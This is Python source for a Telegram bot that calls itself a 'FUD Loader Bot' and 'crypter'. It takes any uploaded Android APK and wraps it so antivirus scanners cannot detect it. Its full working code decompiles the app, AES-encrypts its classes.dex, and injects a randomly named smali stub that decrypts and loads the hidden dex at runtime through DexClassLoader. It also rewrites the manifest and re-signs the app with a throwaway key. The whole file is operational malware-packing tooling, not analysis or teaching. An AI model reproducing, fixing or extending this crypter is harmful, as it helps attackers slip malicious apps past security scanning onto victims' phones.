import os, json, logging, subprocess, shutil, random, string, uuid, base64, re
from pathlib import Path
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv('BOT_TOKEN')
ALLOWED_USERS = json.loads(os.getenv('ALLOWED_USERS', '[]'))
WORK_DIR = os.getenv('WORK_DIR', '/tmp/work')
TEMP_DIR = os.getenv('TEMP_DIR', '/tmp/temp')

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def ensure_dirs():
    Path(WORK_DIR).mkdir(parents=True, exist_ok=True)
    Path(TEMP_DIR).mkdir(parents=True, exist_ok=True)

def is_allowed(uid):
    return not ALLOWED_USERS or uid in ALLOWED_USERS

def run_cmd(cmd, timeout=300):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0:
            logger.error(f"Cmd failed: {' '.join(cmd)}\n{r.stderr}")
            return False
        return True
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return False

def random_letter_string(length=6):
    """Generate a random string that starts with a lowercase letter, rest alphanumeric."""
    first = random.choice(string.ascii_lowercase)
    rest = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length-1))
    return first + rest

def random_class_name():
    """Class name must start with uppercase letter, rest alphanumeric."""
    first = random.choice(string.ascii_uppercase)
    rest = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2,3)))
    return first + rest

def generate_stub(package_name: str, main_activity: str, app_class: str = ""):
    # Random package, classes, asset names
    pkg = "com." + random_letter_string(6) + "." + random_letter_string(6)
    app_cls = random_class_name()   # e.g., 'Abc'
    util_cls = random_class_name()  # e.g., 'Def'
    key_asset = random_letter_string(8) + ".txt"
    dex_asset = random_letter_string(8) + ".dex"

    # Build smali for Application class
    # Note: Use {app_class} if provided, else start launcher activity.
    loader_code = ""
    if app_class:
        loader_code = f"""
    const-string v7, "{app_class}"
    invoke-virtual {{v6, v7}}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v7
    invoke-virtual {{v7}}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
    move-result-object v7
    check-cast v7, Landroid/app/Application;
    const-class v8, Landroid/app/Application;
    const-string v9, "mBase"
    invoke-virtual {{v8, v9}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
    move-result-object v8
    const/4 v9, 0x1
    invoke-virtual {{v8, v9}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getBaseContext()Landroid/content/Context;
    move-result-object v9
    invoke-virtual {{v8, v7, v9}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
    invoke-virtual {{v7}}, Landroid/app/Application;->onCreate()V
"""
    else:
        loader_code = f"""
    const-string v7, "{package_name}"
    const-string v8, "{main_activity}"
    invoke-static {{p0, v7, v8}}, L{pkg}/{util_cls};->startMainActivity(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
"""

    app_smali = f""".class public L{pkg}/{app_cls};
.super Landroid/app/Application;

.method public onCreate()V
    .registers 11
    .prologue
    :try_start
    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getApplicationContext()Landroid/content/Context;
    move-result-object v0

    const-string v1, "{key_asset}"
    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getAssets()Landroid/content/res/AssetManager;
    move-result-object v2
    invoke-virtual {{v2, v1}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v1
    invoke-static {{v1}}, L{pkg}/{util_cls};->readBytes(Ljava/io/InputStream;)[B
    move-result-object v1
    new-instance v2, Ljava/lang/String;
    invoke-direct {{v2, v1}}, Ljava/lang/String;-><init>([B)V
    invoke-virtual {{v2}}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v2
    invoke-static {{v2}}, L{pkg}/{util_cls};->hexToBytes(Ljava/lang/String;)[B
    move-result-object v3

    const-string v4, "{dex_asset}"
    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getAssets()Landroid/content/res/AssetManager;
    move-result-object v5
    invoke-virtual {{v5, v4}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v4
    invoke-static {{v4}}, L{pkg}/{util_cls};->readBytes(Ljava/io/InputStream;)[B
    move-result-object v4

    const-string v5, "AES/ECB/PKCS5Padding"
    invoke-static {{v5}}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v5
    new-instance v6, Ljavax/crypto/spec/SecretKeySpec;
    const-string v7, "AES"
    invoke-direct {{v6, v3, v7}}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    const/4 v7, 0x2
    invoke-virtual {{v5, v7, v6}}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
    invoke-virtual {{v5, v4}}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v4

    const-string v6, "classes.opt"
    const/4 v7, 0x0
    invoke-virtual {{p0, v6, v7}}, L{pkg}/{app_cls};->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    move-result-object v6
    invoke-virtual {{v6, v4}}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {{v6}}, Ljava/io/FileOutputStream;->close()V

    new-instance v6, Ldalvik/system/DexClassLoader;
    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getFilesDir()Ljava/io/File;
    move-result-object v7
    invoke-virtual {{v7}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v7
    const-string v8, "classes.opt"
    invoke-virtual {{p0, v8, v7}}, L{pkg}/{app_cls};->getDir(Ljava/lang/String;I)Ljava/io/File;
    move-result-object v8
    invoke-virtual {{v8}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v8
    const/4 v9, 0x0
    invoke-virtual {{p0}}, L{pkg}/{app_cls};->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v10
    invoke-direct/range {{v6 .. v10}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
{loader_code}
    :try_end
    .catch Ljava/lang/Exception; {{:try_start .. :try_end}} :catch_0
    return-void
    :catch_0
    move-exception v0
    invoke-virtual {{v0}}, Ljava/lang/Exception;->printStackTrace()V
    return-void
.end method
"""

    util_smali = f""".class public L{pkg}/{util_cls};
.super Ljava/lang/Object;

.method public static readBytes(Ljava/io/InputStream;)[B
    .registers 4
    new-instance v0, Ljava/io/ByteArrayOutputStream;
    invoke-direct {{v0}}, Ljava/io/ByteArrayOutputStream;-><init>()V
    const/16 v1, 0x400
    new-array v1, v1, [B
    :loop
    invoke-virtual {{p0, v1}}, Ljava/io/InputStream;->read([B)I
    move-result v2
    const/4 v3, -0x1
    if-eq v2, v3, :write
    const/4 v3, 0x0
    invoke-virtual {{v0, v1, v3, v2}}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :loop
    :write
    invoke-virtual {{v0}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v0
    return-object v0
.end method

.method public static hexToBytes(Ljava/lang/String;)[B
    .registers 7
    invoke-virtual {{p0}}, Ljava/lang/String;->length()I
    move-result v0
    div-int/lit8 v0, v0, 0x2
    new-array v1, v0, [B
    const/4 v2, 0x0
    :loop
    if-ge v2, v0, :endloop
    mul-int/lit8 v3, v2, 0x2
    add-int/lit8 v4, v3, 0x2
    invoke-virtual {{p0, v3, v4}}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    move-result-object v3
    const/16 v4, 0x10
    invoke-static {{v3, v4}}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I
    move-result v3
    int-to-byte v3, v3
    aput-byte v3, v1, v2
    add-int/lit8 v2, v2, 0x1
    goto :loop
    :endloop
    return-object v1
.end method

.method public static startMainActivity(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .registers 6
    new-instance v0, Landroid/content/Intent;
    const-string v1, "android.intent.action.MAIN"
    invoke-direct {{v0, v1}}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    new-instance v1, Landroid/content/ComponentName;
    invoke-direct {{v1, p1, p2}}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-virtual {{v0, v1}}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
    const/high16 v1, 0x10000000
    invoke-virtual {{v0, v1}}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void
.end method
"""

    return app_smali, util_smali, key_asset, dex_asset, pkg, app_cls

def dropper_protect(input_apk: str, output_apk: str) -> bool:
    ensure_dirs()
    dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
    rebuilt = os.path.join(TEMP_DIR, 'rebuilt.apk')
    aligned = os.path.join(TEMP_DIR, 'aligned.apk')
    encrypted_dex = os.path.join(TEMP_DIR, 'payload.enc')
    ks_path = os.path.join(TEMP_DIR, 'rand.keystore')

    if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
        return False

    try:
        manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = f.read()

        package_name = re.search(r'package="([^"]+)"', manifest).group(1)
        main_activity = None
        app_class = None

        # Find Application class
        app_match = re.search(r'<application[^>]*android:name="([^"]*)"', manifest)
        if app_match:
            app_class = app_match.group(1)
            if app_class.startswith('.'):
                app_class = package_name + app_class

        # Find main activity (launcher)
        launcher_re = re.search(r'<activity[^>]*>.*?<action android:name="android\.intent\.action\.MAIN".*?>.*?</activity>', manifest, re.DOTALL)
        if launcher_re:
            act_block = launcher_re.group(0)
            act_name = re.search(r'android:name="([^"]+)"', act_block)
            if act_name:
                main_activity = act_name.group(1)
                if main_activity.startswith('.'):
                    main_activity = package_name + main_activity
        if not main_activity:
            # fallback: first activity
            first_act = re.search(r'<activity[^>]*android:name="([^"]+)"', manifest)
            if first_act:
                main_activity = first_act.group(1)
                if main_activity.startswith('.'):
                    main_activity = package_name + main_activity
        if not main_activity:
            logger.error("Cannot determine main activity")
            return False

        # Encrypt classes.dex
        import zipfile
        with zipfile.ZipFile(input_apk, 'r') as zf:
            dex_data = zf.read('classes.dex')
        key = os.urandom(16)
        key_hex = base64.b16encode(key).decode().lower()
        dex_path = os.path.join(TEMP_DIR, 'classes.dex')
        with open(dex_path, 'wb') as f:
            f.write(dex_data)
        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', dex_path, '-out', encrypted_dex], timeout=60):
            return False

        # Generate stub with safe names
        stub_app, stub_util, key_asset, dex_asset, stub_pkg, stub_app_cls = generate_stub(
            package_name, main_activity, app_class if app_class else ""
        )

        # Assets
        assets_dir = os.path.join(dec_dir, 'assets')
        os.makedirs(assets_dir, exist_ok=True)
        shutil.copy(encrypted_dex, os.path.join(assets_dir, dex_asset))
        with open(os.path.join(assets_dir, key_asset), 'w') as f:
            f.write(key_hex)

        # Remove original smali
        for item in os.listdir(dec_dir):
            if item.startswith('smali'):
                shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)

        # Create stub smali directories (convert package to path)
        pkg_path = stub_pkg.replace('.', '/')[1:] if stub_pkg.startswith('.') else stub_pkg.replace('.', '/')
        stub_dir = os.path.join(dec_dir, 'smali', pkg_path)
        os.makedirs(stub_dir, exist_ok=True)
        with open(os.path.join(stub_dir, stub_app_cls + '.smali'), 'w') as f:
            f.write(stub_app)
        util_cls = re.search(r'\.class public L[^/]+/([^;]+);', stub_util).group(1)
        with open(os.path.join(stub_dir, util_cls + '.smali'), 'w') as f:
            f.write(stub_util)

        # Modify manifest
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = f.read()
        # Remove any existing android:name from application
        manifest = re.sub(r'(<application[^>]*?)android:name="[^"]*"', r'\1', manifest)
        # Add our stub application
        manifest = manifest.replace('<application', f'<application android:name="{stub_pkg}.{stub_app_cls}"')
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(manifest)

        if not run_cmd(['apktool', 'b', '-o', rebuilt, dec_dir], timeout=180):
            return False
        if not run_cmd(['zipalign', '-v', '-p', '4', rebuilt, aligned], timeout=60):
            return False

        ks_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        alias = ''.join(random.choices(string.ascii_letters, k=6))
        dname = f"CN={''.join(random.choices(string.ascii_letters, k=5))}, OU=Dev, O=Org, L=Loc, ST=ST, C={random.choice(['US','GB','IN'])}"
        if not run_cmd(['keytool', '-genkey', '-v', '-keystore', ks_path, '-alias', alias, '-keyalg', 'RSA', '-keysize', '2048', '-validity', '365', '-storepass', ks_pass, '-keypass', ks_pass, '-dname', dname], timeout=30):
            return False
        if not run_cmd(['apksigner', 'sign', '--ks', ks_path, '--ks-pass', f'pass:{ks_pass}', '--ks-key-alias', alias, '--out', output_apk, aligned], timeout=30):
            return False

        return True
    except Exception as e:
        logger.exception("Dropper protect failed")
        return False
    finally:
        shutil.rmtree(dec_dir, ignore_errors=True)
        for f in [encrypted_dex, rebuilt, aligned, ks_path]:
            try: os.remove(f)
            except: pass
        try: os.remove(dex_path)
        except: pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Access denied.")
        return
    await update.message.reply_text("FUD Loader Bot ready. Send APK.")

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_allowed(uid):
        await update.message.reply_text("Access denied.")
        return
    doc: Document = update.message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("Only APK accepted.")
        return
    await update.message.reply_text("Processing with crypter... (max 2 min)")
    fin = os.path.join(WORK_DIR, f"{uid}_{doc.file_name}")
    await (await doc.get_file()).download_to_drive(fin)
    base, ext = os.path.splitext(doc.file_name)
    fout = os.path.join(WORK_DIR, f"{base}_fud{ext}")
    success = False
    try:
        success = dropper_protect(fin, fout)
    except Exception as e:
        logger.exception("Error")
    try: os.remove(fin)
    except: pass
    if success:
        with open(fout, "rb") as f:
            await update.message.reply_document(
                document=f,
                filename=os.path.basename(fout),
                caption="FUD Loader APK ready."
            )
        try: os.remove(fout)
        except: pass
    else:
        await update.message.reply_text("Processing failed. Check logs.")
        if os.path.exists(fout): os.remove(fout)

async def err_handler(update, context):
    logger.error(context.error)

def main():
    ensure_dirs()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    app.add_error_handler(err_handler)
    logger.info("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
